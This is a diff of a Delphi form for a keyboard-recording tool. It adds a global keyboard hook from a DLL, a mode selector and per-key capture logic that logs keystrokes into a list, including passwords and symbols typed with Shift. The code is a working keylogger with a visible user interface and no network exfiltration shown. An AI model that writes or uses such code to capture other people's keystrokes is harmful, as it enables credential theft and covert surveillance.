@@ -12,7 +12,7 @@ uses
   cxStyles, cxTL, cxTextEdit, cxTLdxBarBuiltInMenu, cxInplaceContainer,
   DBClient, SimpleDS, ActnList, dxSkinsdxStatusBarPainter, dxStatusBar,
   cxContainer, cxEdit, dxLayoutcxEditAdapters, cxMaskEdit, cxSpinEdit,
-  ImgList, dxSkinsdxBarPainter, dxBar, cxClasses;
+  ImgList, dxSkinsdxBarPainter, dxBar, cxClasses, cxDropDownEdit;
 
 type
   TfrmKeyHook = class(TForm)
@@ -59,6 +59,9 @@ type
     dxbrbtn_Exit: TdxBarButton;
     dxbrbtn_McSkin: TdxBarButton;
     dxbrbtn_Pumpkin: TdxBarButton;
+    acRecordKeysWithHookDLL: TAction;
+    cxcmbx: TcxComboBox;
+    dxlytm_cxcmbox: TdxLayoutItem;
     procedure Timer_KeyRecTimer(Sender: TObject);
     procedure Timer_SaveToTxTTimer(Sender: TObject);
     procedure Timer_ThreadTimer(Sender: TObject);
@@ -81,6 +84,8 @@ type
     procedure dxbrbtn_ExitClick(Sender: TObject);
     procedure dxbrbtn_McSkinClick(Sender: TObject);
     procedure dxbrbtn_PumpkinClick(Sender: TObject);
+    procedure acRecordKeysWithHookDLLExecute(Sender: TObject);
+    procedure cxcmbxPropertiesChange(Sender: TObject);
   private
     { Private declarations }
     procedure ChangeSkin(SkinName: string);
@@ -99,8 +104,15 @@ implementation
 uses
   Variants, U_Login, KeyHookFunc, SQLite3, SQLite3Wrap, SQLite3Utils;
 
+  function EnableKeyHook: Bool; external 'HookFunc.DLL';
+  function DisableKeyHook: Bool; external 'HookFunc.DLL';
+  function GetKeyCount: Integer; external 'HookFunc.DLL';
+  function GetKey(Index: Integer): Char; external 'HookFunc.DLL';
+  procedure ClearKeyString; external 'HookFunc.DLL';
+
 var
-  F: Textfile;
+  F: TextFile;
+  KeyCount: Integer;
 
 {$R *.DFM}
 
@@ -108,11 +120,19 @@ var
 
 procedure TfrmKeyHook.Timer_KeyRecTimer(Sender: TObject);
 begin
-  //记录所有按键
-  //actRecordKeysExecute(nil);
+  case CPFlag of
+    //采用全局钩子函数获取键盘按键信息
+    cfDefault:
+      acRecordKeysWithHookDLLExecute(nil);
 
-  //只记录数字按键
-  actRecordNumKeysExecute(nil);
+    //只记录数字按键
+    cfNumber:
+      actRecordNumKeysExecute(nil);
+
+    //记录所有按键
+    cfAll:
+      actRecordKeysExecute(nil);
+  end;
 end;
 
 procedure TfrmKeyHook.Timer_SaveToTxTTimer(Sender: TObject);
@@ -146,7 +166,7 @@ end;
 procedure TfrmKeyHook.Timer_ThreadTimer(Sender: TObject);
 begin
   {
-  if DetecThread('Test.exe') = 'exist' then
+  if DetecThread('TEST.EXE') = 'EXIST' then
     begin
       Timer_KeyRec.Enabled := True;
     end
@@ -175,21 +195,31 @@ end;
 
 procedure TfrmKeyHook.Btn_StartClick(Sender: TObject);
 begin
-  Timer_KeyRec.Enabled := True;
-  dxStatusBar.Panels[1].Text := '键盘按键记录正在进行...';
+  //Timer_KeyRec.Enabled := True;
+  if EnableKeyHook then
+  begin
+    Timer_KeyRec.Enabled := True;
 
-  Btn_Start.Enabled := False;
-  Btn_Stop.Enabled := True;
+    dxStatusBar.Panels[1].Text := '键盘按键记录正在进行...';
+
+    Btn_Start.Enabled := False;
+    Btn_Stop.Enabled := True;
+  end;
 end;
 
 procedure TfrmKeyHook.Btn_StopClick(Sender: TObject);
 begin
-  Timer_KeyRec.Enabled := False;
+  //Timer_KeyRec.Enabled := False;
 
-  dxStatusBar.Panels[1].Text := '键盘按键记录已经停止';
+  if DisableKeyHook then
+  begin
+    Timer_KeyRec.Enabled := False;
 
-  Btn_Stop.Enabled := False;
-  Btn_Start.Enabled := True;
+    dxStatusBar.Panels[1].Text := '键盘按键记录已经停止';
+
+    Btn_Stop.Enabled := False;
+    Btn_Start.Enabled := True;
+  end;
 end;
 
 procedure TfrmKeyHook.DelSelectItemClick(Sender: TObject);
@@ -206,7 +236,7 @@ procedure TfrmKeyHook.cxTLst_InfoFocusedNodeChanged(
   Sender: TcxCustomTreeList; APrevFocusedNode,
   AFocusedNode: TcxTreeListNode);
 begin
-  //
+  //自动更正序号
 end;
 
 procedure TfrmKeyHook.ClearAllClick(Sender: TObject);
@@ -296,6 +326,7 @@ begin
                Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '('
              else
                Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '9';
+
         //小数字键盘
         96..105:
              Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + IntToStr(I - 96);
@@ -304,160 +335,184 @@ begin
   end;
 end;
 
+//记录所有键盘按键
 procedure TfrmKeyHook.actRecordKeysExecute(Sender: TObject);
 var
   I: Byte;
+  TmpStr: string;
   Node: TcxTreeListNode;
 begin
   for I := 8 to 222 do
   begin
     if GetAsyncKeyState(I) = -32767 then
     begin
-      Node := cxTLst_Info.Add;
+      if cxTLst_Info.Count > 0 then
+      begin
+        Node := cxTLst_Info.Items[cxTLst_Info.Count - 1];
+        TmpStr := VarToStr(Node.Values[cxtrlstclmn_Info.ItemIndex]);
+        if Length(TmpStr) >= cxSpinEdit.Value then
+        begin
+          TmpStr := '';
+          Node := cxTLst_Info.Add;
+        end;
+      end
+      else
+      begin
+        TmpStr := '';
+        Node := cxTLst_Info.Add;
+      end;
+
       Node.Values[cxtrlstclmn_ID.ItemIndex] := cxTLst_Info.Count;
+
       case I of
-        8:   Node.Values[cxtrlstclmn_Info.ItemIndex] := '[BackSpace]';
-        9:   Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Tab]';
-        13:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Enter]';
-        17:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Ctrl]';
-        27:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Esc]';
-        32:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[BlankSpace]';
+        8:   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[BackSpace]';
+        9:   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Tab]';
+        13:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Enter]';
+        17:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Ctrl]';
+        27:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Esc]';
+        32:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[BlankSpace]';
+
         //Del, Ins, Home, PageUp, PageDown, End
-        33:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Page Up]';
-        34:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Page Down]';
-        35:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[End]';
-        36:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Home]';
+        33:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Page Up]';
+        34:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Page Down]';
+        35:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[End]';
+        36:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Home]';
+
         //Arrow Up, Down, Left, Right
-        37:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Left]';
-        38:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Up]';
-        39:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Right]';
-        40:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Down]';
+        37:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Left]';
+        38:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Up]';
+        39:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Right]';
+        40:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Down]';
+
         //PrintScreen, Insert, Delete, ScrollLock
-        44:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Print Screen]';
-        45:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Insert]';
-        46:  Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Del]';
-        145: Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Scroll Lock]';
+        44:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Print Screen]';
+        45:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Insert]';
+        46:  Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Del]';
+        145: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Scroll Lock]';
+
         //Number: 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 Symbol: !, @, #, $, %, ^, &, *, (, )
         48:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := ')'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + ')'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '0';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '0';
         49:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '!'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '!'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '1';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '1';
         50:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '@'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '@'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '2';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '2';
         51:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '#'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '#'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '3';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '3';
         52:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '$'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '$'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '4';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '4';
         53:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '%'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '%'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '5';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '5';
         54:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '^'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '^'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '6';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '6';
         55:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '&'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '&'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '7';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '7';
         56:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '*'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '*'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '8';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '8';
         57:  if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '('
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '('
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '9';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '9';
         //a..z, A..Z
         65..90:
              begin
                if ((GetKeyState(VK_CAPITAL)) = 1) then
                  if GetKeyState(VK_SHIFT) < 0 then
                    //a..z
-                   Node.Values[cxtrlstclmn_Info.ItemIndex] := LowerCase(Chr(I))
+                   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + LowerCase(Chr(I))
                  else
                    //A..Z
-                   Node.Values[cxtrlstclmn_Info.ItemIndex] := UpperCase(Chr(I))
+                   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + UpperCase(Chr(I))
                else
                  if GetKeyState(VK_SHIFT) < 0 then
                    //A..Z
-                   Node.Values[cxtrlstclmn_Info.ItemIndex] := UpperCase(Chr(I))
+                   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + UpperCase(Chr(I))
                  else
                    //a..z
-                   Node.Values[cxtrlstclmn_Info.ItemIndex] := LowerCase(Chr(I));
+                   Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + LowerCase(Chr(I));
              end;
+
         //Win
-        //91: Node.Values[cxtrlstclmn_Info.ItemIndex] := '[LWin]';
-        //92: Node.Values[cxtrlstclmn_Info.ItemIndex] := '[RWin]';
+        91: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[LWin]';
+        92: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[RWin]';
+
         //NumberPad
         96..105:
              //Number: 0..9
-             Node.Values[cxtrlstclmn_Info.ItemIndex] := IntToStr(I - 96);
-        106: Node.Values[cxtrlstclmn_Info.ItemIndex] := '*';
-        107: Node.Values[cxtrlstclmn_Info.ItemIndex] := '&';
-        109: Node.Values[cxtrlstclmn_Info.ItemIndex] := '-';
-        110: Node.Values[cxtrlstclmn_Info.ItemIndex] := '.';
-        111: Node.Values[cxtrlstclmn_Info.ItemIndex] := '/';
-        144: Node.Values[cxtrlstclmn_Info.ItemIndex] := '[Num Lock]';
+             Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + IntToStr(I - 96);
+        106: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '*';
+        107: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '&';
+        109: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '-';
+        110: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '.';
+        111: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '/';
+        144: Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[Num Lock]';
 
         //F1-F12
         112..123:
-             Node.Values[cxtrlstclmn_Info.ItemIndex] := '[F' + IntToStr(I - 111) + ']';
+             Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[F' + IntToStr(I - 111) + ']';
 
         186: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := ':'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + ':'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := ';';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + ';';
         187: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '+'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '+'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '=';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '=';
         188: if GetKeyState(VK_SHIFT) < 0 then
-              Node.Values[cxtrlstclmn_Info.ItemIndex] := '<'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '<'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := ',';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + ',';
         189: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '_'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '_'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '-';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '-';
         190: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '>'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '>'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '.';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '.';
         191: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '?'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '?'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '/';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '/';
         192: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '~'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '~'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '`';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '`';
         219: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '{'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '{'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '[';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '[';
         220: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '|'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '|'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '\';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '\';
         221: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '}'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '}'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := ']';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + ']';
         222: if GetKeyState(VK_SHIFT) < 0 then
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '"'
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '"'
              else
-               Node.Values[cxtrlstclmn_Info.ItemIndex] := '''';
+               Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + '''';
       end;
     end;
   end;
@@ -683,5 +738,49 @@ begin
   ChangeSkin('Pumpkin');
 end;
 
-end.
+procedure TfrmKeyHook.acRecordKeysWithHookDLLExecute(Sender: TObject);
+var
+  I: Integer;
+  TmpStr: string;
+  Node: TcxTreeListNode;
+begin
+  for I := KeyCount to GetKeyCount - 1 do
+  begin
+    if cxTLst_Info.Count > 0 then
+    begin
+      Node := cxTLst_Info.Items[cxTLst_Info.Count - 1];
+      TmpStr := VarToStr(Node.Values[cxtrlstclmn_Info.ItemIndex]);
+      if Length(TmpStr) >= cxSpinEdit.Value then
+      begin
+        TmpStr := '';
+        Node := cxTLst_Info.Add;
+      end;
+    end
+    else
+    begin
+      TmpStr := '';
+      Node := cxTLst_Info.Add;
+    end;
 
+    Node.Values[cxtrlstclmn_ID.ItemIndex] := cxTLst_Info.Count;
+
+    Node.Values[cxtrlstclmn_Info.ItemIndex] := TmpStr + GetKey(I);
+  end;
+
+  KeyCount := GetKeyCount;
+
+end;
+
+procedure TfrmKeyHook.cxcmbxPropertiesChange(Sender: TObject);
+begin
+  case cxcmbx.ItemIndex of
+    0:
+      CPFlag := cfDefault;
+    1:
+      CPFlag := cfNumber;
+    2:
+      CPFlag := cfAll;
+  end;
+end;
+
+end.
